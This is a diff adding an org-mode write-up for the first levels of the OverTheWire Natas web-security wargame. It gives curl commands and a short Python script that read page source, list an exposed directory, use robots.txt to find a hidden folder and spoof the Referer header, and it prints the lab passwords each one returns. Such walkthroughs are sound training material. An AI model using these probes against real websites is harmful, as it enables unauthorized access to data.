@@ -1,0 +1,96 @@
+* Natas
+** Introduction
+This is a writeup for the [[https://overthewire.org/wargames/][overthewire.org]] war game Natas. To start a level 
+visit the URL http://natasX.natas.labs.overthewire.org, and login with 
+username: natasX and the password found in the previous level, where X is the 
+level number.
+
+** Level 0
+View the source page and find the password:
+
+#+BEGIN_SRC shell
+curl -u natas0:natas0 "http://natas0.natas.labs.overthewire.org/" | grep natas1
+#+END_SRC
+
+#+RESULTS:
+: <!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
+
+** Level 1
+View the source page by using a short cut key (for me <C-u>, Ctrl+u):
+
+#+BEGIN_SRC shell
+curl -u natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto  "http://natas1.natas.labs.overthewire.org/" | grep natas2
+#+END_SRC
+
+#+RESULTS:
+: <!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
+
+** Level 2
+Again view the source page. There is a line that link to an image scr{<img src="files/pixel.png">}
+
+#+BEGIN_SRC 
+<img src="files/pixel.png">
+#+END_SRC
+
+This links to "http://natas2.natas.labs.overthewire.org/files/pixel.png", note 
+the /files/pixels.png. Which means it might be possible to explorer the files 
+'files' directory. Exploring "http://natas2.natas.labs.overthewire.org/files/" 
+it shows that there it another file called 'users.txt' which contains the 
+password for the next level.
+
+#+BEGIN_SRC shell
+curl -u natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi "http://natas2.natas.labs.overthewire.org/files/users.txt" | grep natas3
+#+END_SRC
+
+#+RESULTS:
+: natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+
+** Level 3
+View the source and find the line
+
+#+BEGIN_SRC 
+<!-- No more information leaks!! Not even Google will find it this time... -->
+#+END_SRC
+
+which hints at the 'robots.txt' file that contains the directories webcrawlers are not supossed to visit. From the 'robots.txt' we get the directory '/s3cr3t/' which contains the 'users.txt' file with the password for natas4.
+
+#+BEGIN_SRC shell
+curl -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 "http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt" | grep natas4
+#+END_SRC
+
+#+RESULTS:
+: natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+** Level 4
+To get access to the password we need to come from the natas5 website as is 
+metioned on the website when first loging in. 
+#+BEGIN_SRC 
+Access disallowed. You are visiting from "" while authorized users should come 
+only from "http://natas5.natas.labs.overthewire.org/"
+#+END_SRC
+It is possible to simulate this by setting the referer in the header of the get
+request to the natas5 website.
+#+BEGIN_SRC python
+import requests
+from requests.auth import HTTPBasicAuth
+
+user = "natas4"
+pswd = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"
+url = "http://natas4.natas.labs.overthewire.org/"
+headers = {'referer': 'http://natas5.natas.labs.overthewire.org/'}
+
+# get request with the referer set to natas5
+r = requests.get(url, headers=headers, auth=HTTPBasicAuth(user,pswd))
+
+# find the line with the password in it
+lines = r.text.split('\n')
+bools = list(map(lambda x : "password" in x, lines))
+for (b,line) in zip(bools,lines):
+    if b:
+        return line
+#+END_SRC
+
+#+RESULTS:
+: Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+** Level 5
